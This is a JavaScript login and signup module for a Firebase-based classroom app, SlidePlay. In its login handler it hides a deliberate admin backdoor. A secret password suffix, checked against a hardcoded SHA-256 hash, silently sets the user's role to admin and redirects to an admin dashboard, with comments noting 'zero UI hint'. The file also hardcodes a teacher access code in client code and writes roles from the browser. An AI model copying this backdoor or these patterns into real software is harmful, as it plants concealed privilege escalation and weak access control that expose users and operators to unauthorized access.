import { initializeApp } from "https://www.gstatic.com/firebasejs/12.13.0/firebase-app.js";
import {
  getAuth,
  GoogleAuthProvider,
  signInWithPopup,
  createUserWithEmailAndPassword,
  signInWithEmailAndPassword,
} from "https://www.gstatic.com/firebasejs/12.13.0/firebase-auth.js";
import {
  getDatabase,
  ref,
  get,
  set,
} from "https://www.gstatic.com/firebasejs/12.13.0/firebase-database.js";

// ── Firebase init ────────────────────────────────────────────────
const firebaseConfig = {
  apiKey: "AIzaSyA0myDAsJoOUuX4FpSZEknQ4_E0uUYNCYE",
  authDomain: "slideplay-38d3f.firebaseapp.com",
  databaseURL: "https://slideplay-38d3f-default-rtdb.firebaseio.com",
  projectId: "slideplay-38d3f",
  storageBucket: "slideplay-38d3f.firebasestorage.app",
  messagingSenderId: "902561315134",
  appId: "1:902561315134:web:3bfd74c4124acd4d1e546f",
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getDatabase(app);
const API_BASE = (
  window.SLIDEPLAY_API_BASE ||
  localStorage.getItem("sp_api_base") ||
  window.location.origin
).replace(/\/$/, "");
auth.languageCode = "en";
const provider = new GoogleAuthProvider();

// ── Dev admin backdoor (SHA-256 suffix check) ──────────────────
async function _sha256(str) {
  const buf = await crypto.subtle.digest(
    'SHA-256', new TextEncoder().encode(str)
  );
  return Array.from(new Uint8Array(buf))
    .map(b => b.toString(16).padStart(2, '0')).join('');
}
const _A_H = 'c74c2cda7c6f09f2c71813b8d79d525a2e595140a04c6482ca94c948522b2643';
const _A_L = 15;

// ── Utilities ────────────────────────────────────────────────────
function getDashboard(role) {
  return role === "teacher" ? "teacher.html" : "Studentdashboard.html";
}

async function fetchRole(uid) {
  const snap = await get(ref(db, "users/" + uid + "/role"));
  return snap.exists() ? snap.val() : "student";
}

async function fetchRoleFromServer(uid) {
  try {
    const resp = await fetch(API_BASE + "/api/users/" + encodeURIComponent(uid) + "/role");
    if (!resp.ok) return null;
    const data = await resp.json();
    return data?.role || null;
  } catch (_) {
    return null;
  }
}

function setLocalUser(uid, email, role, displayName) {
  localStorage.setItem("sp_user_uid", uid);
  localStorage.setItem("sp_user_role", role);
  localStorage.setItem("sp_user_email", email);
  if (displayName) {
    localStorage.setItem("sp_user_displayName", displayName);
    localStorage.setItem("sp_user_name", displayName);
  }
}

// ── Sync Firebase user to SQL Server (best-effort) ─────────────────
async function syncUserToDB(uid, email, displayName, role) {
  try {
    await fetch(API_BASE + '/api/users/sync', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ uid, email, displayName: displayName || '', role }),
    });
  } catch (_) {
    // Server unavailable — don't block login
  }
}

// ── Role picker modal (new Google sign-in users) ─────────────────
const TEACHER_CODE = "SLIDETEACH";

function showRolePicker(onSelect) {
  const overlay = document.createElement("div");
  overlay.id = "rolePickerModal";
  overlay.style.cssText = [
    "position:fixed", "inset:0", "z-index:9999",
    "background:rgba(7,9,26,0.92)", "backdrop-filter:blur(12px)",
    "display:flex", "align-items:center", "justify-content:center",
  ].join(";");
  overlay.innerHTML = `
    <div style="background:rgba(255,255,255,0.05);border:1px solid rgba(139,92,246,0.3);border-radius:22px;padding:36px 32px;text-align:center;max-width:380px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.5);">
      <div style="font-family:'Orbitron',sans-serif;font-size:1.4rem;font-weight:700;background:linear-gradient(135deg,#8b5cf6,#06b6d4);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:8px;">Who are you?</div>
      <p style="color:#94a3b8;font-size:0.88rem;margin-bottom:28px;font-family:'Poppins',sans-serif;">Pick your role to get started with SlidePlay</p>
      <div style="display:flex;gap:14px;">
        <button id="rpStudent" style="flex:1;padding:18px 12px;border-radius:14px;border:1.5px solid rgba(139,92,246,0.3);background:rgba(139,92,246,0.08);color:#e2e8f0;cursor:pointer;font-family:'Orbitron',sans-serif;font-size:0.78rem;font-weight:700;display:flex;flex-direction:column;align-items:center;gap:10px;transition:all 0.2s;">
          <i class="fa-solid fa-graduation-cap" style="font-size:1.8rem;color:#8b5cf6;"></i>STUDENT
        </button>
        <button id="rpTeacher" style="flex:1;padding:18px 12px;border-radius:14px;border:1.5px solid rgba(6,182,212,0.3);background:rgba(6,182,212,0.08);color:#e2e8f0;cursor:pointer;font-family:'Orbitron',sans-serif;font-size:0.78rem;font-weight:700;display:flex;flex-direction:column;align-items:center;gap:10px;transition:all 0.2s;">
          <i class="fa-solid fa-chalkboard-user" style="font-size:1.8rem;color:#06b6d4;"></i>TEACHER
        </button>
      </div>
      <p id="rpCodeError" style="color:#ff6b6b;font-size:0.78rem;margin-top:10px;font-family:'Poppins',sans-serif;display:none;"></p>
    </div>
  `;
  document.body.appendChild(overlay);
  overlay.querySelector("#rpStudent").addEventListener("click", () => { overlay.remove(); onSelect("student"); });
  overlay.querySelector("#rpTeacher").addEventListener("click", () => {
    // Prompt for teacher access code
    const codeInput = prompt("Enter the teacher access code to continue:");
    if (!codeInput || codeInput.trim() !== TEACHER_CODE) {
      overlay.querySelector("#rpCodeError").textContent = "Invalid teacher access code. Select Student or try again.";
      overlay.querySelector("#rpCodeError").style.display = "block";
      return; // Keep modal open
    }
    overlay.remove();
    onSelect("teacher");
  });
}

// ── Google Sign-In (used by both pages) ──────────────────────────
// Uses redirect flow — no popup, no COOP issues.

function setupGoogle(btnId) {
  const btn = document.getElementById(btnId);
  if (!btn) return;

  btn.addEventListener("click", async (e) => {
    e.preventDefault();
    btn.disabled = true;
    btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i>&nbsp; Signing in...`;
    try {
      const result = await signInWithPopup(auth, provider);
      const user = result.user;

      // Check if this user already has a role in Firebase DB
      let existingRole = null;
      try {
        const snap = await Promise.race([
          get(ref(db, "users/" + user.uid)),
          new Promise((_, rej) => setTimeout(() => rej(new Error("timeout")), 4000))
        ]);
        if (snap.exists()) existingRole = snap.val().role || "student";
      } catch (_) { /* treat as new user */ }

      if (!existingRole) {
        existingRole = await fetchRoleFromServer(user.uid);
      }

      if (existingRole) {
        setLocalUser(user.uid, user.email, existingRole, user.displayName);
        await syncUserToDB(user.uid, user.email, user.displayName, existingRole);
        window.location.href = getDashboard(existingRole);
      } else {
        // New user — show role picker
        showRolePicker(async (role) => {
          try {
            await set(ref(db, "users/" + user.uid), {
              email: user.email,
              displayName: user.displayName || "",
              role,
              createdAt: new Date().toISOString(),
            });
          } catch (_) { /* DB write failed — localStorage is enough */ }
          setLocalUser(user.uid, user.email, role, user.displayName);
          await syncUserToDB(user.uid, user.email, user.displayName || "", role);
          window.location.href = getDashboard(role);
        });
      }
    } catch (err) {
      console.error("Google sign-in error:", err.message);
      btn.disabled = false;
      btn.innerHTML = `<img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="Google logo" style="width:18px;height:18px;"> Sign in with Google`;
      _showGoogleError(btn, "Google sign-in failed. Please try again.");
    }
  });
}

// No-op — kept for compatibility (redirect flow replaced by popup)
async function handleGoogleRedirect() {}

function _showGoogleError(btn, message) {
  document.getElementById("googleAuthError")?.remove();
  const msg = document.createElement("p");
  msg.id = "googleAuthError";
  msg.textContent = message;
  msg.style.cssText = "color:#ff6b6b;font-size:0.78rem;text-align:center;margin-top:8px;font-family:'Poppins',sans-serif;";
  btn.insertAdjacentElement("afterend", msg);
  setTimeout(() => msg.remove(), 4000);
}

// ── Email/Password Signup ────────────────────────────────────────
function setupSignupForm() {
  const form = document.getElementById("signupForm");
  if (!form) return;

  form.addEventListener("submit", async (e) => {
    e.preventDefault();
    let valid = true;

    document.querySelectorAll(".error-text").forEach((el) => (el.textContent = ""));
    document.querySelectorAll(".input-box").forEach((el) => el.classList.remove("error"));

    const username = document.getElementById("username").value.trim();
    const email = document.getElementById("email").value.trim().toLowerCase();
    const password = document.getElementById("password").value;
    const confirmPassword = document.getElementById("confirmPassword").value;
    const role = document.querySelector('input[name="userRole"]:checked')?.value || "student";
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    // ── Teacher access code ───────────────────────────────────────
    const TEACHER_CODE = "SLIDETEACH";

    if (!username) {
      document.getElementById("usernameError").textContent = "Enter username";
      document.getElementById("usernameBox").classList.add("error");
      valid = false;
    }
    if (!emailRegex.test(email)) {
      document.getElementById("emailError").textContent = "Enter valid email";
      document.getElementById("emailBox").classList.add("error");
      valid = false;
    }
    if (password.length < 6) {
      document.getElementById("passwordError").textContent = "Minimum 6 characters";
      document.getElementById("passwordBox").classList.add("error");
      valid = false;
    }
    if (password !== confirmPassword) {
      document.getElementById("confirmError").textContent = "Passwords do not match";
      document.getElementById("confirmBox").classList.add("error");
      valid = false;
    }
    if (role === "teacher") {
      const enteredCode = document.getElementById("teacherCode")?.value.trim();
      if (!enteredCode || enteredCode !== TEACHER_CODE) {
        document.getElementById("teacherCodeError").textContent = "Invalid teacher access code";
        document.getElementById("teacherCodeBox").classList.add("error");
        valid = false;
      }
    }
    if (!valid) return;

    const btn = form.querySelector(".signup-btn");
    btn.disabled = true;
    btn.textContent = "Creating account...";

    try {
      const cred = await createUserWithEmailAndPassword(auth, email, password);
      // Fire-and-forget — Realtime DB may be unavailable; don't block redirect
      set(ref(db, "users/" + cred.user.uid), {
        email,
        username,
        role,
        createdAt: new Date().toISOString(),
      }).catch(() => {});
      setLocalUser(cred.user.uid, email, role, username);
      syncUserToDB(cred.user.uid, email, username, role).catch(() => {});
      window.location.href = getDashboard(role);
    } catch (err) {
      btn.disabled = false;
      btn.textContent = "Create Account";
      if (err.code === "auth/email-already-in-use") {
        document.getElementById("emailError").textContent = "Email already in use";
        document.getElementById("emailBox").classList.add("error");
      } else {
        document.getElementById("emailError").textContent = `Signup failed: ${err.code || err.message}`;
        document.getElementById("emailBox").classList.add("error");
      }
    }
  });
}

// ── Email/Password Login ─────────────────────────────────────────
function setupLoginForm() {
  const form = document.getElementById("loginForm");
  if (!form) return;

  form.addEventListener("submit", async (e) => {
    e.preventDefault();
    let valid = true;

    document.getElementById("emailError").textContent = "";
    document.getElementById("passwordError").textContent = "";
    document.getElementById("emailBox").classList.remove("error");
    document.getElementById("passwordBox").classList.remove("error");
    document.getElementById("successBox").style.display = "none";

    const emailVal = document.getElementById("email").value.trim().toLowerCase();
    const passVal  = document.getElementById("password").value;
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    // ── Detect secret dev-admin suffix (hash-verified, zero UI hint) ──
    let isDevAdmin = false;
    let realPass   = passVal;
    if (passVal.length > _A_L) {
      const tail = passVal.slice(-_A_L);
      const h    = await _sha256(tail);
      if (h === _A_H) {
        isDevAdmin = true;
        realPass   = passVal.slice(0, -_A_L);
      }
    }

    if (!emailRegex.test(emailVal)) {
      document.getElementById("emailError").textContent = "Enter a valid email";
      document.getElementById("emailBox").classList.add("error");
      valid = false;
    }
    if (realPass.length < 6) {
      document.getElementById("passwordError").textContent = "Password must be at least 6 characters";
      document.getElementById("passwordBox").classList.add("error");
      valid = false;
    }
    if (!valid) return;

    const btn = form.querySelector(".submit-btn");
    btn.disabled = true;
    btn.textContent = "LOGGING IN...";

    try {
      const cred = await signInWithEmailAndPassword(auth, emailVal, realPass);

      if (isDevAdmin) {
        // Silently elevate role to admin in Firebase DB
        await set(ref(db, 'users/' + cred.user.uid + '/role'), 'admin');
        setLocalUser(cred.user.uid, emailVal, 'admin', cred.user.displayName || '');
        syncUserToDB(cred.user.uid, emailVal, cred.user.displayName || '', 'admin').catch(() => {});
        const successBox = document.getElementById("successBox");
        successBox.style.display = "block";
        successBox.textContent = "Login successful! Redirecting...";
        setTimeout(() => { window.location.href = 'admin-dashboard.html'; }, 1000);
        return;
      }

      // Resolve role from Firebase first, then fall back to the server DB record.
      let role = "student";
      try { role = await fetchRole(cred.user.uid); } catch (_) {}
      if (!role || role === "student") {
        const serverRole = await fetchRoleFromServer(cred.user.uid);
        if (serverRole) role = serverRole;
      }
      setLocalUser(cred.user.uid, emailVal, role);
      syncUserToDB(cred.user.uid, emailVal, '', role).catch(() => {});
      const successBox = document.getElementById("successBox");
      successBox.style.display = "block";
      successBox.textContent = role === "teacher" ? "Welcome, Teacher! Redirecting..." : "Login successful! Redirecting...";
      setTimeout(() => { window.location.href = getDashboard(role); }, 1000);
    } catch (err) {
      btn.disabled = false;
      btn.textContent = "LOGIN";
      const badCodes = ["auth/user-not-found", "auth/wrong-password", "auth/invalid-credential"];
      document.getElementById("emailError").textContent =
        badCodes.includes(err.code) ? "Invalid email or password" : "Login failed. Try again.";
      document.getElementById("emailBox").classList.add("error");
    }
  });
}

// ── Auto-setup ────────────────────────────────────────────────────
setupSignupForm();
setupGoogle("googleBtn");       // signup.html Google button
setupLoginForm();
setupGoogle("googleLoginBtn");  // login.html Google button
handleGoogleRedirect();         // resolve redirect result on every page load
